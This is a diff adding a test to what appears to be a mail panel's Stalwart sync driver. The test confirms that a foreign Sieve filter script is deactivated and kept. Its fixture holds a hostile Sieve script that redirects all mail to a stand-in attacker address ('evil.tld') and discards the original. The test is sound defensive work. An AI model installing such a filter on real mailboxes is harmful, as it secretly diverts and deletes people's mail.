@@ -189,6 +189,25 @@ test('stalwart sync: first pass creates domains, accounts, lists, config, sieve;
   assert.equal(fake.calls.slice(before3).filter((c) => c.method !== 'GET').length, 0);
 });
 
+test('stalwart sync: a sieve script that is not the panel\'s never stays active (ManageSieve closed, MA-SIEVE)', async () => {
+  const { fake, driver } = setup();
+  // Uploaded over ManageSieve before it was closed: active, redirecting everything.
+  for (const who of ['md5@exemple.fr', 'contact@exemple.fr']) {
+    fake.sieve.set(who, new Map([['roundcube', { id: `f-${who}`, content: 'redirect "x@evil.tld";\r\ndiscard;\r\n', active: true }]]));
+  }
+  const r = await driver.sync(baseState(), { reason: 'test' });
+  assert.deepEqual(r.domainErrors, {});
+  // contact@ has a panel script: ours is THE active one. md5@ has none: the foreign one is deactivated.
+  assert.equal(fake.sieve.get('contact@exemple.fr')!.get('oblimint')!.active, true);
+  assert.equal(fake.sieve.get('contact@exemple.fr')!.get('roundcube')!.active, false);
+  assert.equal(fake.sieve.get('md5@exemple.fr')!.get('roundcube')!.active, false);
+  assert.equal(fake.sieve.get('md5@exemple.fr')!.size, 1, 'kept (the user\'s data), inactive');
+  // Checked once: the next pass does not visit them again.
+  const before = fake.calls.length;
+  await driver.sync(baseState(), { reason: 'test' });
+  assert.equal(fake.calls.slice(before).filter((c) => c.path.startsWith('/jmap') || c.path.startsWith('/.well-known')).length, 0);
+});
+
 test('stalwart sync: updates, address moves, disable instead of delete, detach', async () => {
   const { fake, driver } = setup();
   await driver.sync(baseState(), { reason: 'test' });
